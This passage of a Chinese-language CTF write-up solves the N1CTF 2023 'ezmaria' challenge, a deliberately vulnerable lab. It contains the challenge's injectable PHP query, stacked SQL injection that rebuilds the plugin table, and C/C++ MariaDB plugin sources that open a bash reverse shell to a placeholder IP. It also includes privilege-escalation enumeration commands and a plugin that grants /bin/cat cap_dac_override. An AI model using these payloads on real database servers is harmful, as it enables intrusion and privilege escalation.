class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-12 <span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;开搜&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">style</span>&gt;</span></span><br><span class="line"><span class="class">    .<span class="title">left</span>-<span class="title">align</span> </span>&#123;</span><br><span class="line">        text-align: left;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;section <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">bg</span>-<span class="title">light</span> <span class="title">features</span>-<span class="title">icons</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">h5</span>&gt;<span class="title">Key</span> <span class="title">Source</span>&lt;/<span class="title">h5</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">left</span>-<span class="title">align</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                $<span class="title">hstr</span> = </span></span><br><span class="line"><span class="class">&lt;&lt;&lt;<span class="title">XS</span></span></span><br><span class="line"><span class="class">\\$<span class="title">cmd</span> = &quot;<span class="title">select</span> <span class="title">name</span>, <span class="title">price</span> <span class="title">from</span> <span class="title">items</span> <span class="title">where</span> <span class="title">id</span> = &quot;.\\$<span class="title">_REQUEST</span>[&quot;<span class="title">id</span>&quot;];</span></span><br><span class="line"><span class="class">\\$<span class="title">result</span> = <span class="title">mysqli_fetch_all</span>(\\$<span class="title">result</span>);</span></span><br><span class="line"><span class="class">\\$<span class="title">result</span> = \\$<span class="title">result</span>[0];</span></span><br><span class="line"><span class="class"><span class="title">XS</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">highlight_string</span>($<span class="title">hstr</span>, <span class="title">false</span>);</span></span><br><span class="line"><span class="class">            ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">h5</span>&gt;<span class="title">Executed</span> <span class="title">Operations</span>:&lt;/<span class="title">h5</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">left</span>-<span class="title">align</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">highlight_string</span>($<span class="title">cmd</span>) ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">highlight_string</span>($<span class="title">result</span>); ?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">section</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">section</span> <span class="title">class</span>=&quot;<span class="title">showcase</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span> <span class="title">p</span>-0&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">g</span>-0&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">section</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#x27;,</span></span><br><span class="line"><span class="class">)</span></span><br></pre></td></tr></table></figure>
+
+<p>传个参试试</p>
+<p><img src="/2023/11/03/n1ctf-ezmaira/1.png"></p>
+<p>以看到mysql的plugin目录是<code>/mysql/plugin</code>以及<code>secure-file-priv</code>是空的，过滤了outfile但没有过滤dumpfile，而且使用的是multi_query，可以进行堆叠注入</p>
+<p>从上面来看过滤板了function这个关键词也就是说无法利用udf进行create function<br>但是INSTALL PLUGIN 的功能可以利用，因为同样也是加载 plugin_dir 里边的 so 文件</p>
+<p>所以我们可以编译一个so文件然后让mysql直接install自动加载so文件可以利用这个反弹shell</p>
+<p>可是发现数据库没有初始化，但是利用了<code>skip-grant-tables</code>这个<br>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ibsfn/article/details/88963040">https://blog.csdn.net/ibsfn/article/details/88963040</a><br>可以跳过权限进行回复表<br>利用堆叠注入进行恢复表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS mysql;</span><br><span class="line">use mysql;</span><br><span class="line">CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT &#x27;&#x27; NOT NULL, dl varchar(128) DEFAULT &#x27;&#x27; NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=&#x27;MySQL plugins&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后编写插件进行自加载so文件</p>
+<p>版本一：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init()&#123;    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;&quot;</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/N03QtNsMvpux42xIAXxvrA">https://mp.weixin.qq.com/s/N03QtNsMvpux42xIAXxvrA</a></p>
+<p>版本二：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELETE</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DELETE</span>()&#123;</span><br><span class="line">        <span class="built_in">lshell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">DELETE <span class="keyword">delete</span>;</span><br><span class="line">DELETE* _mysql_plugin_interface_version_ = &amp;<span class="keyword">delete</span>;</span><br><span class="line"><span class="comment">//compile: g++ expso.cpp -shared -fPIC -o exp.so</span></span><br></pre></td></tr></table></figure>
+<p>参考lolita师傅写的：<a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/writeup.md">https://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/writeup.md</a></p>
+<p>将编译出来的so文件用dumpfile写到&#x2F;mysql&#x2F;plugin&#x2F;目录</p>
+<p>可以用lolita师傅写的py直接弹shell<br><a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/exp.py">https://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/exp.py</a></p>
+<p>发现没有权限读flag<br>所以找suid和cap(纯抄)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/mariadb cap_setfcap=ep</span><br></pre></td></tr></table></figure>
+<p>关于linux的setcap看文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/xdy762024688/article/details/132237969">https://blog.csdn.net/xdy762024688/article/details/132237969</a></p>
+<p>大概的意思就是在2.1版本之后有了“分权”的概念，然后利用这个获取读取文件的能力</p>
+<p>也就是我们能给其他文件设置cap<br>给mariadb写个插件</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">cap_t</span> caps = <span class="built_in">cap_from_text</span>(<span class="string">&quot;cap_dac_override=eip&quot;</span>);</span><br><span class="line">    <span class="built_in">cap_set_file</span>(<span class="string">&quot;/bin/cat&quot;</span>, caps);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setcap finished\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELETE</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DELETE</span>()&#123;</span><br><span class="line">        <span class="built_in">lshell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">DELETE _mysql_client_plugin_declaration_;</span><br><span class="line"><span class="comment">//compile: g++ expcap.cpp -shared -fPIC -o cap.so -lcap2</span></span><br></pre></td></tr></table></figure>
+<p>然后上传到靶机有三个方式<br>一、发现机器上有curl 直接外部下载远程的服务器上的so文件<br>二、lolita师傅的exp里面的命令可以直接穿越<br>三、利用python再次dumpfile进去</p>
+<p>这里当时我有个问题就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mariadb --plugin-dir=. --default-auth=cap</span><br></pre></td></tr></table></figure>
+<p>他可以自己配路径，所以不需要考虑自己的so文件上传到哪里去<br>最后直接cat  &#x2F;flag</p>
+<p>拿下<br><img src="/2023/11/03/n1ctf-ezmaira/3.png"></p>
+<p>每次复现都能学到很多东西，加油加油</p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2023/10/31/ACTF/"
+      title="ACTF2023 WP"
+     >
+
+    <p class="title-text">
+      
+        ACTF2023 WP
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 DELETE<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
